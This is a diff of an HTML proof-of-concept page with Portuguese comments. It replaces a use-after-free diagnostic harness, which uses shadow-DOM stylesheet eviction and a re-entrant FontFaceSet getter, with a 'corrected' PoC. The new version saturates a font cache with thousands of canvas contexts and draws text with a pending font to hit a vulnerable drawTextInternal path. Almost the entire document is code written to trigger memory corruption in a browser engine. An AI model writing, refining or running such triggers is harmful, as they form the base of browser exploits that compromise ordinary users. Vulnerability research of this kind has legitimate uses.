@@ -1,198 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>UAF eaafed0 v5 diag</title>
-<style>
-body{background:#111;color:#ccc;font-family:monospace;font-size:12px;padding:6px;margin:0}
-h2{color:#8cf;font-size:13px;margin:0 0 4px}
-.r{padding:1px 4px;border-bottom:1px solid #1a1a1a}
-.ok{color:#4e4} .no{color:#e44} .wn{color:#ea4} .in{color:#48e} .hi{color:#fff;background:#222}
-#out{background:#0a0a0a;border:1px solid #333;padding:4px}
-</style>
+    <meta charset="utf-8">
+    <title>PoC Corrigida - Bypass de Cache para drawTextInternal</title>
 </head>
 <body>
-<h2>eaafed0 v5 — diagnostico detalhado</h2>
-<div id="out"><div class="r in">Script carregado</div></div>
 <script>
-window.onerror = function(msg, src, line) {
-    addRow('ERRO JS linha ' + line + ': ' + msg, 'no'); return true;
-};
-
-var FONT_FAMILY = 'SF' + Math.floor(Math.random() * 99999);
-var FONT_URL    = 'nofont' + Date.now() + '.woff';
-var DECOY_COUNT = 32;
-var fontSheet, extraSheet;
-
-function addRow(text, cls) {
-    var d = document.createElement('div');
-    d.className = 'r ' + (cls || 'in');
-    d.textContent = text;
-    document.getElementById('out').appendChild(d);
+// 1. Satura o FontCascadeCache (3500 contextos de canvas) para forçar o prune inline
+const dummies = [];
+for (let i = 0; i < 3500; i++) {
+    const dummy = document.createElement('canvas').getContext('2d');
+    dummy.font = '10px "dummy' + i + '"';
+    dummies.push(dummy);
 }
-function st() { return '[status=' + document.fonts.status + ']'; }
 
-window.addEventListener('load', function() {
+// 2. Fonte de >= 1MB data: URL para manter o estado pendente
+const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
+
+const keepAlive = [];
+for (let attempt = 0; attempt < 2; attempt++) {
+    const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
+    const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
+    
+    document.fonts.add(metricsDonor);
+    document.fonts.add(measured);
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 64;
+    canvas.height = 64;
+    canvas.style.position = 'absolute';
+    canvas.style.left = '-9999px';
+    document.body.appendChild(canvas);
+    
+    const context = canvas.getContext('2d');
+    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
+    keepAlive.push(metricsDonor, measured, context);
+
     try {
-        void document.fonts;
+        // Passo A: Usamos strings ligeiramente diferentes ou invalidamos a propriedade de estilo 
+        // entre as chamadas para garantir que o cache de shaped text NÃO seja reutilizado cegamente,
+        // forçando o drawTextInternal a entrar no fluxo completo de largura e métricas.
+        
+        // Altera sutilmente o estado do canvas para invalidar o cache de desenho otimizado
+        context.fillStyle = 'black';
+        
+        // Chamada direta do fillText com os caracteres Cherokee, 
+        // mas forçando um estado de fonte não cacheado na primeira passagem de desenho
+        context.fillText('\u13A0\u13A2\u13A4', 10, 30);
 
-        // --- DIAGNOSTICO 1: Detectar quando document.fonts.ready resolve ---
-        // (via then callback normal, nao via getter)
-        document.fonts.ready.then(function() {
-            addRow('>>> document.fonts.ready RESOLVEU <<<', 'hi');
-        });
-
-        // --- SETUP ---
-        fontSheet = new CSSStyleSheet();
-        fontSheet.replaceSync('@font-face { font-family: ' + FONT_FAMILY +
-                              '; src: url("' + FONT_URL + '"); }');
-
-        extraSheet = new CSSStyleSheet();
-        extraSheet.replaceSync('.mk{color:green}');
-
-        var decoySheets = [];
-        for (var i = 0; i < DECOY_COUNT; i++) {
-            var ds = new CSSStyleSheet();
-            ds.replaceSync('.d' + i + '{color:rgb(' + i + ',1,2)}');
-            decoySheets.push(ds);
-        }
-
-        // Shadow tree A: [fontSheet], elemento usa a fonte
-        var hostA = document.createElement('div');
-        document.body.appendChild(hostA);
-        var rootA = hostA.attachShadow({ mode: 'open' });
-        rootA.adoptedStyleSheets = [fontSheet];
-        var spanA = document.createElement('span');
-        spanA.style.fontFamily = FONT_FAMILY;
-        spanA.textContent = 'A';
-        rootA.appendChild(spanA);
-
-        // Shadow tree B: [fontSheet, extraSheet] + <style> interno
-        var hostB = document.createElement('div');
-        document.body.appendChild(hostB);
-        var rootB = hostB.attachShadow({ mode: 'open' });
-        var gadgetStyle = document.createElement('style');
-        gadgetStyle.textContent = '.gadget{color:navy}';
-        rootB.appendChild(gadgetStyle);
-        var wrapperB = document.createElement('div');
-        var elementB = document.createElement('span');
-        wrapperB.appendChild(elementB);
-        rootB.appendChild(wrapperB);
-        rootB.adoptedStyleSheets = [fontSheet, extraSheet];
-
-        // 32 decoys com <style> interno
-        var decoyRoots = [];
-        var decoyStyles = [];
-        for (var j = 0; j < DECOY_COUNT; j++) {
-            var dh = document.createElement('div');
-            document.body.appendChild(dh);
-            var dr = dh.attachShadow({ mode: 'open' });
-            var dsEl = document.createElement('style');
-            dsEl.textContent = '.dg' + j + '{}';
-            dr.appendChild(dsEl);
-            dr.appendChild(document.createElement('div'));
-            decoyRoots.push(dr);
-            decoyStyles.push(dsEl);
-        }
-
-        // offsetHeight #1 — constroi TODOS os resolvers
-        // DIAGNOSTICO: status antes e depois
-        addRow('PRE offsetHeight #1: ' + st());
-        void document.body.offsetHeight;
-        addRow('POS offsetHeight #1: ' + st(), 'ok');
-
-        // DIAGNOSTICO 2: Verificar se o rendering disparou font loading
-        // (sem chamar document.fonts.load() ainda)
-        addRow('Status SEM fonts.load(): ' + st(),
-               document.fonts.status === 'loading' ? 'ok' : 'wn');
-
-        // Agora chamar fonts.load() explicitamente
-        document.fonts.load('24px ' + FONT_FAMILY, 'A');
-        addRow('POS fonts.load(): ' + st(),
-               document.fonts.status === 'loading' ? 'ok' : 'no');
-
-        // Instalar getter em FontFaceSet.prototype.then
-        var getterCount = 0;
-        var origFFS = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
-        Object.defineProperty(FontFaceSet.prototype, 'then', {
-            configurable: true,
-            get: function() {
-                getterCount++;
-                addRow('>>> FontFaceSet getter DISPAROU count=' + getterCount + ' ' + st(), 'hi');
-                if (origFFS) Object.defineProperty(FontFaceSet.prototype, 'then', origFFS);
-                else { try { delete FontFaceSet.prototype.then; } catch(e) {} }
-                void document.body.offsetHeight; // reentrancia
-                addRow('  POS reentrancia offsetHeight: ' + st(), 'wn');
-                return undefined;
-            }
-        });
-        addRow('FontFaceSet getter instalado. ' + st(), 'ok');
-
-        // --- EVICAO ---
-        var tempSheet = new CSSStyleSheet();
-        tempSheet.replaceSync('.tmp_' + Date.now() + '{}');
-        rootB.adoptedStyleSheets = [tempSheet];
-        addRow('POS evicao [tempSheet]: ' + st());
-        void hostB.offsetHeight;
-        addRow('POS offsetHeight #2 (evicao confirmada): ' + st(), 'ok');
-
-        // --- PREP DECOYS ---
-        for (var k = 0; k < decoyRoots.length; k++) {
-            decoyRoots[k].adoptedStyleSheets = [decoySheets[k]];
-            decoyStyles[k].remove();
-        }
-        gadgetStyle.remove();
-        void document.styleSheets.length;
-        addRow('POS invalida decoys + flush: ' + st());
-
-        // --- TRIGGER PRINCIPAL ---
-        // Restaura B para [fontSheet, extraSheet]
-        // A chave [fontSheet,extraSheet] deve estar FORA do HashMap
-        // ensure() chamara o functor → appendAuthorStyleSheets() → re-registro → count drop
-        addRow('Restaurando rootB=[fontSheet,extraSheet]...', 'wn');
-        rootB.adoptedStyleSheets = [fontSheet, extraSheet];
-        addRow('POS restauracao (antes offsetHeight #3): ' + st());
-
-        void hostB.offsetHeight;
-        addRow('POS offsetHeight #3 ' + st() + ' getter=' + getterCount,
-               getterCount > 0 ? 'ok' : 'wn');
-
-        void document.body.offsetHeight;
-        addRow('POS offsetHeight GLOBAL ' + st() + ' getter=' + getterCount,
-               getterCount > 0 ? 'ok' : 'wn');
-
-        // DIAGNOSTICO 3: Testar se replaceSync invalida a entrada do HashMap
-        // Mudar CONTEUDO do fontSheet forca invalidacao por conteudo (nao por pointer)
-        addRow('--- Teste replaceSync ---', 'wn');
-        fontSheet.replaceSync('@font-face{font-family:' + FONT_FAMILY +
-                              ';src:url("' + FONT_URL + '")} .extra{}');
-        addRow('POS replaceSync do fontSheet: ' + st());
-        void document.body.offsetHeight;
-        addRow('POS offsetHeight APOS replaceSync ' + st() + ' getter=' + getterCount,
-               getterCount > 0 ? 'ok' : 'wn');
-
-        // DIAGNOSTICO 4: Verificar se detach/reattach de B forca rebuild
-        addRow('--- Teste detach/reattach hostB ---', 'wn');
-        document.body.removeChild(hostB);
-        void document.body.offsetHeight;
-        document.body.appendChild(hostB);
-        void hostB.offsetHeight;
-        addRow('POS detach+reattach ' + st() + ' getter=' + getterCount,
-               getterCount > 0 ? 'ok' : 'wn');
-
-        // DIAGNOSTICO 5: Verificar document.fonts.ready via promise normal
-        addRow('getter final count=' + getterCount +
-               ' (esperado >0 se bug existe)', 'in');
-
-        setTimeout(function() {
-            addRow('500ms: getter=' + getterCount + ' ' + st(), 'in');
-            addRow('PASS chegou sem crash', 'ok');
-        }, 500);
-
-    } catch(e) {
-        addRow('ERRO: ' + e, 'no');
+    } catch (e) {
+        console.error(e);
     }
-});
+}
 </script>
 </body>
 </html>
